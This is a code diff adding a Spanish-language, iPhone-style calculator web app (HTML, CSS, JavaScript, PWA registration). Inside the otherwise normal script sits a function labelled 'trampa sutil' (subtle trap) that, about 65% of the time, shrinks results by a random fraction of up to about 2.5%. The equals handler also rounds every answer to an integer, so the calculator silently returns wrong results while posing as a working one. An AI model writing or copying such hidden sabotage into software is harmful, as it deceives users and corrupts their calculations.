@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="Calculadora">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<link rel="apple-touch-icon" href="icon.png">
+<link rel="manifest" href="manifest.json">
+
+<title>Calculadora</title>
+
+<style>
+html, body {
+  margin:0;
+  height:100%;
+  background:black;
+  overflow:hidden;
+  font-family:-apple-system;
+}
+
+/* 📱 posición estilo iPhone (abajo, no centrado) */
+.calc {
+  position: fixed;
+  bottom: 0;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 100%;
+  max-width: 390px;
+
+  padding: 0 16px calc(28px + env(safe-area-inset-bottom));
+  box-sizing: border-box;
+}
+
+/* display */
+#display {
+  color:white;
+  font-size:72px;
+  text-align:right;
+  padding:10px 6px 18px;
+  margin-top:40px;
+  overflow:hidden;
+}
+
+/* grid */
+.grid {
+  display:grid;
+  grid-template-columns: repeat(4,1fr);
+  gap:12px;
+}
+
+/* botones */
+button {
+  height:78px;
+  border-radius:50%;
+  border:none;
+  font-size:28px;
+  background:#2b2b2b;
+  color:white;
+}
+
+button:active {
+  transform:scale(0.94);
+  filter:brightness(1.15);
+}
+
+.light { background:#a5a5a5; color:black; }
+.op { background:#ff9500; }
+
+/* botón 0 */
+.zero {
+  grid-column: span 2;
+  border-radius:40px;
+  text-align:left;
+  padding-left:28px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="calc">
+  <div id="display">0</div>
+
+  <div class="grid">
+    <button class="light" onclick="clearAll()">AC</button>
+    <button class="light" onclick="toggleSign()">±</button>
+    <button class="light" onclick="percent()">%</button>
+    <button class="op" onclick="setOp('/')">÷</button>
+
+    <button onclick="num(7)">7</button>
+    <button onclick="num(8)">8</button>
+    <button onclick="num(9)">9</button>
+    <button class="op" onclick="setOp('*')">×</button>
+
+    <button onclick="num(4)">4</button>
+    <button onclick="num(5)">5</button>
+    <button onclick="num(6)">6</button>
+    <button class="op" onclick="setOp('-')">−</button>
+
+    <button onclick="num(1)">1</button>
+    <button onclick="num(2)">2</button>
+    <button onclick="num(3)">3</button>
+    <button class="op" onclick="setOp('+')">+</button>
+
+    <button class="zero" onclick="num(0)">0</button>
+    <button onclick="dot()">.</button>
+    <button class="op" onclick="equal()">=</button>
+  </div>
+</div>
+
+<script>
+let display = document.getElementById("display");
+let current="0", prev=null, op=null, reset=false;
+
+function update(){ display.innerText=current; }
+
+function num(n){
+  if(current==="0"||reset){ current=""+n; reset=false; }
+  else current+=n;
+  update();
+}
+
+function dot(){
+  if(!current.includes(".")) current+=".";
+  update();
+}
+
+function clearAll(){
+  current="0"; prev=null; op=null;
+  update();
+}
+
+function toggleSign(){
+  current=(parseFloat(current)*-1).toString();
+  update();
+}
+
+function percent(){
+  if(prev!==null){
+    let p=parseFloat(current);
+    current=(prev*p/100).toString();
+  } else {
+    current=(parseFloat(current)/100).toString();
+  }
+  update();
+}
+
+function setOp(o){
+  prev=parseFloat(current);
+  op=o;
+  reset=true;
+}
+
+/* 😈 trampa sutil */
+function trap(real){
+
+  let aplicar = Math.random() < 0.65;
+  if(!aplicar) return real;
+
+  let error;
+
+  if(Math.abs(real)>1000){
+    error=Math.random()*0.02+0.005;
+  }else if(Math.abs(real)>100){
+    error=Math.random()*0.015+0.003;
+  }else{
+    error=Math.random()*0.01+0.001;
+  }
+
+  let fake = real*(1-error);
+
+  if(fake>=real){
+    fake=real-0.01;
+  }
+
+  return fake;
+}
+
+function equal(){
+  if(op===null||prev===null) return;
+
+  let curr=parseFloat(current);
+  let result=0;
+
+  if(op==="+") result=prev+curr;
+  if(op==="-") result=prev-curr;
+  if(op==="*") result=prev*curr;
+  if(op==="/") result=prev/curr;
+
+  result=trap(result);
+
+  current=Math.round(result).toString();
+  op=null; prev=null; reset=true;
+
+  update();
+}
+
+/* swipe borrar */
+let startX=0;
+display.addEventListener("touchstart",e=>{
+  startX=e.touches[0].clientX;
+});
+
+display.addEventListener("touchend",e=>{
+  let endX=e.changedTouches[0].clientX;
+  if(endX<startX-50){
+    current=current.slice(0,-1)||"0";
+    update();
+  }
+});
+
+/* PWA */
+if('serviceWorker' in navigator){
+  navigator.serviceWorker.register('sw.js');
+}
+</script>
+
+</body>
+</html>
